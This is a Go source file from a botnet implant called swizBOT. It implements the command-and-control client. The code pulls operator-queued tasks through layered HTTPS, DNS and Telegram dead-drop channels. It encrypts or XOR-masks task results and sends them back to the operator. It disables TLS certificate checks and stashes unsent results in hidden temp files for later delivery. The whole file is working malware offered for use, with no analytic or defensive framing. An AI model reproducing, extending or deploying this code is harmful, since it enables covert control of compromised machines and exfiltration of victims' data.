package main

import (
	"bytes"
	"context"
	"crypto/ecdh"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"github.com/saviorSEC/swizBOT/internal/channel"
	"github.com/saviorSEC/swizBOT/internal/transport"
)

// Command is a task queued by the operator and delivered on checkin.
type Command struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Target  string `json:"target"`
}

// IsEmpty reports whether the C2 had nothing queued.
func (c Command) IsEmpty() bool { return c.ID == "" && c.Type == "" }

// Response is a task result sent back to the C2, AEAD-sealed to the
// operator (or XOR-obfuscated in legacy lab mode).
type Response struct {
	BotID     string `json:"bot_id"`
	CommandID string `json:"command_id"`
	Output    string `json:"output"`
	Status    string `json:"status"`
}

// XorMask applies the single-byte obfuscation mask.
func XorMask(data []byte, key byte) {
	for i := range data {
		data[i] ^= key
	}
}

// C2Client talks to the operator through a layered, failover transport
// stack (HTTPS -> DNS -> Telegram dead drop, see cmd/bot/layers.go). It
// owns the payload crypto: commands are opened with the implant's own
// key, results are sealed to the operator key.
type C2Client struct {
	cfg       Config
	endpoints []string
	next      int
	http      *http.Client
	ownPriv   *ecdh.PrivateKey // implant X25519 keypair (SWIZ_BOT_KEY)
	opPub     *ecdh.PublicKey  // operator public key (SWIZ_C2_PUBKEY)
	tr        *transport.Manager
}

func NewC2Client(cfg Config) *C2Client {
	urls := make([]string, 0, len(cfg.C2URLs))
	urls = append(urls, cfg.C2URLs...)

	t := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true}, // self-signed operator certs
		DialContext:       (&net.Dialer{Timeout: 10 * time.Second}).DialContext,
		ForceAttemptHTTP2: true,
	}
	c := &C2Client{
		cfg:       cfg,
		endpoints: urls,
		http:      &http.Client{Transport: t, Timeout: 30 * time.Second},
	}
	// load the implant keypair when configured (enables the sealed channel)
	if cfg.BotKey != "" {
		if k, err := channel.ParsePrivateKey(cfg.BotKey); err == nil {
			c.ownPriv = k
		} else {
			logf("invalid SWIZ_BOT_KEY: %v", err)
		}
	}
	if cfg.OpPubKey != "" {
		if k, err := channel.ParsePublicKey(cfg.OpPubKey); err == nil {
			c.opPub = k
		} else {
			logf("invalid SWIZ_C2_PUBKEY: %v", err)
		}
	}

	// fallback stack, ordered by priority (HTTPS -> DNS -> Telegram)
	layers := []transport.Layer{httpLayer{c: c}}
	if cfg.DNSDomain != "" {
		layers = append(layers, dnsLayer{c: c})
	}
	if cfg.TGToken != "" {
		layers = append(layers, telegramLayer{c: c})
	}
	c.tr = transport.New(layers,
		transport.WithProbation(3, 30*time.Second),
		transport.WithMaxProbation(30*time.Minute))
	return c
}

// cryptoPubKeyHex returns the implant public key (hex) for registration,
// or "" when crypto is not configured.
func (c *C2Client) cryptoPubKeyHex() string {
	if c.ownPriv == nil {
		return ""
	}
	return hex.EncodeToString(c.ownPriv.PublicKey().Bytes())
}

// sealResult encrypts a result body for the operator when crypto is
// configured; otherwise returns the XOR-masked body (legacy mode).
//
// It never mutates the caller's slice: the plaintext body may still be
// needed afterwards (SendResult caches it for the next flush), and an
// in-place XOR mask would corrupt that cache.
func (c *C2Client) sealResult(data []byte) []byte {
	if c.opPub != nil {
		if sealed, err := channel.Seal(c.opPub, data); err == nil {
			return sealed
		}
	}
	out := make([]byte, len(data))
	copy(out, data)
	XorMask(out, c.cfg.XOR)
	return out
}

func (c *C2Client) shuffle() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	rng.Shuffle(len(c.endpoints), func(i, j int) {
		c.endpoints[i], c.endpoints[j] = c.endpoints[j], c.endpoints[i]
	})
}

// AddEndpoints merges extra discovered endpoints (DNS/P2P), capped.
func (c *C2Client) AddEndpoints(more ...string) {
	seen := make(map[string]bool, len(c.endpoints)+len(more))
	for _, e := range c.endpoints {
		seen[e] = true
	}
	for _, e := range more {
		e = stringsTrim(e)
		if e == "" || seen[e] {
			continue
		}
		seen[e] = true
		if len(c.endpoints) >= 32 {
			break
		}
		c.endpoints = append(c.endpoints, e)
	}
}

func stringsTrim(s string) string {
	return string(bytes.TrimSpace([]byte(s)))
}

func (c *C2Client) nextEndpoint() string {
	if len(c.endpoints) == 0 {
		return ""
	}
	e := c.endpoints[c.next%len(c.endpoints)]
	c.next++
	return e
}

func (c *C2Client) authed(req *http.Request) {
	if c.cfg.BotSecret != "" {
		req.Header.Set("X-Bot-Secret", c.cfg.BotSecret)
	}
}

func urlQueryEscape(s string) string {
	return url.QueryEscape(s)
}

func runtimeGOOS() string   { return runtime.GOOS }
func runtimeGOARCH() string { return runtime.GOARCH }

// markCrypto announces AEAD support when the implant keypair is set.
func (c *C2Client) markCrypto(req *http.Request) {
	if c.ownPriv != nil {
		req.Header.Set("X-Crypto", "1")
	}
}

// openSealed decrypts a server response: the server seals to this
// implant's registered public key, so the implant opens with its own
// private key.
func (c *C2Client) openSealed(body []byte) ([]byte, error) {
	if c.ownPriv == nil {
		return nil, errors.New("server sent sealed body but no implant key configured")
	}
	return channel.Open(c.ownPriv, body)
}

func waitCtx(ctx context.Context, d time.Duration) {
	select {
	case <-ctx.Done():
	case <-time.After(d):
	}
}

// Checkin pulls one command through the fallback stack. A nil Command
// with nil error means every reachable layer was healthy but idle.
func (c *C2Client) Checkin(ctx context.Context) (*Command, bool, error) {
	if c.tr == nil {
		return nil, false, errors.New("no transports configured")
	}
	frame, _, err := c.tr.Poll(ctx)
	if err != nil {
		return nil, false, err
	}
	body := frame.Body
	if frame.Sealed {
		body, err = c.openSealed(body)
		if err != nil {
			return nil, frame.Paused, err
		}
	}
	if len(body) == 0 {
		return nil, frame.Paused, nil
	}
	var cmd Command
	if err := json.Unmarshal(body, &cmd); err != nil {
		return nil, frame.Paused, err
	}
	return &cmd, frame.Paused, nil
}

// SendResult pushes a result through the fallback stack. On total
// failure the plaintext body is cached to disk for the next flush.
func (c *C2Client) SendResult(ctx context.Context, resp Response) error {
	data, err := json.Marshal(resp)
	if err != nil {
		return err
	}
	sealed := c.sealResult(data)
	if c.tr == nil {
		c.cacheResult(data)
		return errors.New("no transports configured; result cached")
	}
	if _, err := c.tr.Push(ctx, sealed); err != nil {
		c.cacheResult(data)
		return errors.New("all transports failed; result cached")
	}
	return nil
}

// cacheResult stores the plaintext JSON body so it can be re-sealed with a
// fresh ephemeral key on every flush attempt.
func (c *C2Client) cacheResult(data []byte) {
	cacheDir := c.cacheDir()
	name := filepath.Join(cacheDir, fmt.Sprintf(".swiz_cache_%d", time.Now().UnixNano()))
	os.WriteFile(name, data, 0o600)
}

func (c *C2Client) cacheDir() string {
	dir := filepath.Join(os.TempDir(), "swizbot")
	os.MkdirAll(dir, 0o700)
	return dir
}

// FlushCache retries every cached result once; files are removed only
// after the C2 acknowledges them.
func (c *C2Client) FlushCache(ctx context.Context) {
	entries, err := os.ReadDir(c.cacheDir())
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() || len(e.Name()) < 12 || e.Name()[:11] != ".swiz_cache" {
			continue
		}
		full := filepath.Join(c.cacheDir(), e.Name())
		data, err := os.ReadFile(full)
		if err != nil {
			continue
		}
		// cached bodies are plaintext JSON (SendResult seals at send time)
		var resp Response
		if json.Unmarshal(data, &resp) != nil {
			os.Remove(full)
			continue
		}
		if err := c.SendResult(ctx, resp); err == nil {
			os.Remove(full)
		}
	}
}
